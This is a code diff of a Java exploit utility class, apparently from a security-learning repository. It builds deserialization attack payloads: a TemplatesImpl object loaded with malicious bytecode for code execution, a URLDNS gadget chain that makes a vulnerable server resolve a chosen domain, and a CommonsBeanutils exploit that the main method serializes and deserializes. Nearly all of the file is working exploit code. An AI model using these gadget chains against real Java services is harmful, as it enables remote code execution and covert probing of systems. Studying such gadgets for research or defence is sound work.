@@ -18,8 +18,9 @@ import static expUtils.ReflectUtils.getClassByte;
 public class ExpUtils {
     public static TemplatesImpl getEvilTemplates() throws NoSuchFieldException, IllegalAccessException, IOException {
         TemplatesImpl templates = new TemplatesImpl();
-        ReflectUtils.setFields(templates,"_name","xxf");
-        byte[] evilCode = getClassByte("target/classes/ExpUtils/TemplatesEvilClass.class");
+        ReflectUtils.setFields(templates,"_name","9eek");
+        byte[] evilCode = getClassByte("sec-common/target/classes/expUtils/TemplatesEvilClass.class");
+//        byte[] evilCode = getObectClassByte(TemplatesEvilClass.class);
         byte[][] templatesEvilCode = new byte[][]{evilCode};
         ReflectUtils.setFields(templates,"_bytecodes",templatesEvilCode);
         ReflectUtils.setFields(templates,"_tfactory",new TransformerFactoryImpl());
@@ -29,16 +30,30 @@ public class ExpUtils {
 //    URLDNS链 带参数方式
     public static HashMap<Object,Object> getURLDNSChains(String targetUrl) throws MalformedURLException, NoSuchFieldException, IllegalAccessException {
         HashMap<Object,Object> hashMap = new HashMap<Object,Object>();
-        URL url = new URL(targetUrl);
+        URL url = new URL(null,targetUrl,new SilenceURLHandler());
         hashMap.put(url,"1");
         ReflectUtils.setFields(url,"hashCode",-1);
+//        ReflectUtils.setFields(url,"handler",new SilenceURLHandler());
         return hashMap;
     }
+
+    // 获取一个对象的class byte文件
+    public static byte[] getSerialObectClassByte(Object obj) throws IOException {
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(byteArrayOutputStream);
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(bufferedOutputStream);
+        objectOutputStream.writeObject(obj);
+        bufferedOutputStream.close();
+//        byteArrayOutputStream.close();
+
+        return byteArrayOutputStream.toByteArray();
+    }
+
     //    URLDNS链 默认方式
     public static HashMap<Object,Object> getURLDNSChains() throws MalformedURLException, NoSuchFieldException, IllegalAccessException {
         String prefix = String.valueOf(new Random().nextInt(100));
 //        HashMap<Object,Object> hashMap = new HashMap<Object,Object>();
-        String targetUrl  = "http://" + prefix + ".a.9eek.cn";
+        String targetUrl  = "http://" + prefix + ".a.qq.com";
         return getURLDNSChains(targetUrl);
     }
 
@@ -78,6 +93,11 @@ public class ExpUtils {
 
 
     public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException {
-        unserialize(serialize(getCommonBeanExp()));
+//        System.out.println(System.getProperty("user.dir"));
+//        byte[] evilCode = getClassByte("sec-common/target/classes/expUtils/TemplatesEvilClass.class");
+//        System.out.println(evilCode.length);
+//        byte[] aaa = getObectClassByte(TemplatesImpl.class);
+//        System.out.println(aaa.length);
+        getURLDNSChains();
     }
 }
